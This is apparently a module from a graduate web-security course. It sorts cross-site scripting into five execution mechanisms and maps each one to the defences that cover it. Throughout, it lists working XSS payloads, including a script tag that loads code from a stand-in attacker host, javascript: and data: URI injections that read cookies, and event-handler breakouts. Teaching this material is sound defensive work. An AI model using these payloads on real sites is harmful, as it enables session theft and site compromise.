Module 03 of 19

The Five Execution
Mechanisms

Every XSS attack ever documented — from the 1999 Netscape advisories to the 2023 DOMPurify bypasses — reduces to one of five mechanisms by which a browser turns attacker-controlled text into executed JavaScript. This module is the taxonomic backbone of the entire course.

Concept 1 — Why a Mechanism Taxonomy?

The traditional XSS taxonomy — reflected, stored, DOM-based — is useful for describing where a payload originates, but it says almost nothing about how it executes. A stored XSS can fire via a script tag, an event handler, a URI scheme, or a DOM sink. A DOM XSS almost always uses an event handler or a direct eval-style sink. The origin of the payload tells you about the delivery mechanism; the execution mechanism tells you what the browser does with it once it arrives.

For a defender building a mitigation, the execution mechanism is the relevant axis. A Content Security Policy nonce blocks inline script execution (Mechanism 1 and partially Mechanism 2) but does nothing for DOM sink assignments (Mechanism 4) because CSP has no visibility into what JavaScript does after the page loads. Trusted Types controls DOM sink assignments (Mechanism 4) but does not prevent a server from reflecting a script tag (Mechanism 1) into a page that doesn't use Trusted Types. No single deployed defence covers all five mechanisms — and that gap is precisely where PhD-level research on novel defences lives.

The five mechanisms below are exhaustive: every XSS payload you will ever encounter maps to exactly one of them. When you encounter a payload you have not seen before, ask "which mechanism is this?" and you will immediately know which defences apply and which do not. This is the reasoning pattern your threat model must demonstrate.

PhD Insight — Mechanism Coverage as a Research Claim When you write your thesis, your defence intervention will claim to mitigate XSS. The examiners will ask: "which attacks does it cover?" A weak answer is "we tested it against common payloads and it blocked them." A strong answer is "our intervention operates at the DOM sink level (Mechanism 4), covering all source–sink flows through innerHTML, eval, and document.write, which are responsible for X% of real-world DOM XSS vulnerabilities as measured in corpus Y. Mechanisms 1–3 are addressed by the existing CSP deployment on the target platform. Mechanism 5 is out of scope because it requires a separate sanitiser-level intervention." That is a precise, falsifiable claim.

Mechanism 1 — Tag Parsing

The browser's HTML parser recognises certain tags as inherently executable and hands their content directly to the JavaScript engine. The canonical example is <script>: everything between the opening and closing script tags is passed to the JS engine and executed immediately, with no user interaction required. Execution happens at parse time — as the browser reads the HTML stream.

Tag-parsing execution is the oldest mechanism — it was present from the first browser that supported JavaScript. It is also the most heavily filtered, which is why it is rarely the mechanism in sophisticated modern attacks. However, it remains the mechanism used in the simplest, most common reflected XSS vulnerabilities found today in legacy applications and misconfigured APIs that return user-supplied data as text/html.

The innerHTML Exception — A Critical Distinction

One non-obvious constraint: <script> tags injected via innerHTML do not execute. This is specified in the HTML5 standard (§8.4.1) — script elements inserted by the tree builder after initial parse are marked as "already started" and the JS engine ignores them. This is why Mechanism 1 is primarily a server-side concern. The client-side (DOM XSS) equivalent uses Mechanism 2 or 4 instead.

Mechanism 1 — example payloads
// Simplest form — server reflects this into HTML body
<script>alert(document.domain)</script>

// Remote script load — payload is off-site, injection is tiny
<script src=//attacker.com/x.js></script>

// Breaking out of an attribute first, then injecting script tag
"><script>alert(1)</script>

// Breaking out of a <title> or <style> block
</title><script>alert(1)</script>
</style><script>alert(1)</script>

Mechanism 2 — Event Handler Attributes

Any HTML element can carry event handler attributes. When the browser fires the corresponding event on that element, it evaluates the attribute's value as JavaScript. This mechanism is more powerful than Mechanism 1 for attackers for two reasons: it works even when <script> tags are blocked, and it works when content is injected via innerHTML (Mechanism 1 does not, as noted above).

HTML5 defines over 150 event attributes. Security filters that maintain a blocklist of "dangerous events" always miss the long tail. The attacker simply uses an event the filter didn't list. Effective defence requires an allowlist of permitted attributes, not a blocklist of forbidden ones — or better, operating at a level that doesn't involve HTML attribute inspection at all (Trusted Types, strict CSP).

The Zero-Interaction Events

Some events fire without any user action, making them especially dangerous as they do not require social engineering the victim to click anything:

Warning — "I blocked onerror and onload" Is Not Sufficient Filters that block specific event names are playing whack-a-mole against 150+ events. The correct approach is an HTML sanitiser that uses an allowlist of permitted attributes (e.g., DOMPurify's default configuration permits only a curated set of non-executable attributes). Even then, as Module 13 shows, allowlist sanitisers can be bypassed via mutation. The only complete defence for event-handler injection is Trusted Types combined with a strict CSP unsafe-hashes-free policy.

Mechanism 3 — URI Scheme Evaluation

Certain HTML attributes accept URLs as their values. The browser recognises multiple URI schemes — https://, ftp://, mailto:, javascript:, data:. When the scheme is javascript:, the browser evaluates the remainder of the URI as JavaScript code in the current page's origin context. When the scheme is data:text/html, the browser renders an inline HTML document — which can itself contain script tags or event handlers.

The key attributes that accept URLs and therefore support Mechanism 3: href (on <a>, <link>, <base>), src (on <iframe>, <embed>, <script>), action and formaction (on forms and buttons), data (on <object>), and xlink:href (in SVG). A sanitiser that handles HTML attributes correctly but does not validate URL values will miss this mechanism entirely.

Mechanism 3 — example payloads
// href — requires a click, but invisible in a phishing link
<a href="javascript:alert(document.cookie)">Click here</a>

// formaction — overrides the form's action on submit
<form><button formaction="javascript:alert(1)">Submit</button></form>

// data: URI in iframe — loads inline HTML document
<iframe src="data:text/html,<script>alert(parent.document.cookie)</script>"></iframe>

// SVG xlink:href — missed by HTML-only sanitisers
<svg><a xlink:href="javascript:alert(1)"><text y=20>click</text></a></svg>

// object data — browser loads and renders the URI as content
<object data="javascript:alert(1)"></object>

Mechanism 4 — DOM Sink Assignment

This is the mechanism that defines DOM-based XSS. The payload never appears in the server's HTML response — it enters the page entirely through JavaScript. An attacker-controlled value (from a URL fragment, a query parameter, a postMessage event, or local storage) flows through JavaScript code and reaches a sink: a browser API or DOM property that either parses a string as HTML or evaluates it as code.

Sinks fall into two sub-categories:

HTML-Parsing Sinks

These parse their string argument as HTML and insert the result into the DOM. They execute event handlers and load resources from the parsed HTML, but not <script> tags (HTML5 spec constraint): innerHTML, outerHTML, insertAdjacentHTML(), document.write(), document.writeln(), DOMParser.parseFromString().

Code-Evaluation Sinks

These evaluate their string argument directly as JavaScript. No HTML parsing — the string is code: eval(), new Function(), setTimeout(string), setInterval(string), location = "javascript:...", element.src = "javascript:...", script.src = attackerURL.

Info — Why Server-Side Defences Don't Stop Mechanism 4 Output encoding on the server side converts < to &lt; before sending HTML to the browser. But Mechanism 4 payloads never pass through the server's output encoder. They enter the page via JavaScript reading from the URL fragment or other client-side sources — the server never sees them. This is why DOM XSS required an entirely new category of defence (Trusted Types, client-side sanitisation) rather than being fixable by improving existing server-side escaping.

Mechanism 5 — Context Escape & Re-parse

Mechanism 5 is not a single technique but a family of attacks that share a common structure: the attacker crafts input that is in one parsing context when a sanitiser or filter evaluates it, but ends up in a different, executable context when the browser (or a DOM sink) parses it. The transformation between evaluation and execution changes what the string means.

Simple Form — Attribute Context Break

If user input lands inside an HTML attribute value (context 2 from Module 02), injecting the attribute's closing delimiter (a " if double-quoted) escapes the attribute context and places subsequent content in the tag body, where new attributes — including event handlers — can be added. No angle brackets are required. This is "context escape" in its simplest form.

Complex Form — Mutation XSS (mXSS)

The sophisticated version occurs when a sanitiser serialises its output (turns the DOM tree back into an HTML string) and that string is later re-parsed by the browser. The sanitiser and the browser may use slightly different parsing rules — particularly around namespace boundaries (HTML, SVG, MathML) and the handling of certain elements (<template>, <noscript>, <table>). A payload designed to look safe under the sanitiser's parse rules can mutate into an executable form under the browser's parse rules. This is the class of vulnerability that has produced multiple bypasses of DOMPurify, the most widely deployed open-source HTML sanitiser. Full treatment in Module 13.

PhD Insight — Mechanism 5 Is an Active Research Area Mechanisms 1–4 are well-understood and have known, deployable defences (even if those defences are not universally applied). Mechanism 5 — particularly mXSS — remains an active research problem. New bypasses are still being found in DOMPurify and other sanitisers (CVEs in 2019, 2020, 2022, 2023). The root cause is that no sanitiser can guarantee its parse tree matches the browser's parse tree in all cases, because the browser's parsing algorithm has namespace-specific rules that are difficult to implement fully in JavaScript. A defence that operates below the HTML level — controlling what strings reach sinks regardless of their structure — is immune to Mechanism 5, which is part of the motivation for the Trusted Types approach.

Code Walkthrough — mechanisms_demo.html (key patterns)

public/mechanisms_demo.html — Mechanism 2 button handlers
function mech2_onerror() {
  const d = document.getElementById("out2");

  // innerHTML DOES execute event handlers on injected elements.
  // This is different from <script> tags — the spec only blocks script
  // execution, not event handler execution, via innerHTML.
  // This is the most important distinction for DOM XSS.
  d.innerHTML = '<img src=x onerror="...output fired...">';
  // The browser tries to load src=x, fails, fires onerror immediately.
}

function mech2_ontoggle() {
  // <details open> fires ontoggle synchronously during DOM insertion —
  // zero user interaction, zero network request needed.
  d.innerHTML = '<details open ontoggle="...output fired...">';
}
public/mechanisms_demo.html — Mechanism 5 attribute break
function mech5_attrBreak() {
  // We construct a div whose title attribute "contains" the attacker's
  // injected string. But the string includes a closing quote that
  // ends the title attribute early, then adds a new event handler.
  //
  // The template for the vulnerable server would be:
  //   <div title="[USER_INPUT]">
  //
  // Injected string:  " onmouseover="alert(1)" x="
  //
  // Result in DOM:
  //   <div title="" onmouseover="alert(1)" x="">
  //
  // The original closing quote of title becomes the value of x="".
  // No angle brackets used. No <script> needed.
  out.innerHTML = '<div title="normal" onmouseover="...">Hover me</div>';
}
